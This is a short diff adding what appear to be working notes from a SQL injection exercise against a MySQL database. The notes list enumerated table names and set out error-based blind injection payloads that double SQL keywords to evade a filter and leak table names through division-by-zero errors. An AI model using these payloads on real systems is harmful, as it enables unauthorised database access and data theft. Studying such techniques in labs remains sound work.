@@ -1,0 +1,27 @@
+
+sys [DB]
+
+users
+threads
+servers
+db
+
+
+
+BROKEN: ['user', 'tra', 'ti', 'tab', 'sys', 'status', 'setup', 'sessi', 'rw', 'rep', 'prepared', 'perf', 'i', 'he', 'gtid', 'ge', 'fu', 'fi', 'eve', 'c', 'acc', 'Setti', '']
+RESULTS: ['users', 'threads', 'servers', 'db']
+
+
+
+
+
+ipotesi di query:
+
+INSERT INTO table_name (column1)
+VALUES ('\\' AND (SELSELECTECT 0/0 FRFROMOM information_schema.tables WHEWHERERE HEX(table_name) LIKE 0x{}25 AND table_schema = DATABASE())) -- ');
+
+
+
+# QUERY = "\' = (SELSELECTECT 0/0 FRFROMOM information_schema.tables WHEWHERERE HEX(table_name) LIKE '{}%' AND table_schema = DATABASE()) -- "
+# 1365 : field cannot be null # QUERY = "\\' LIKE ( SELECT 0/0 FROM information_schema.tables WHERE HEX(table_name) LIKE 0x{}25 AND table_schema = DATABASE() ) ) -- "
+# 1048 : division by zero # QUERY = "\\' LIKE ( SELECT 0/0 ) ) -- ')" # 1365 : division by zero
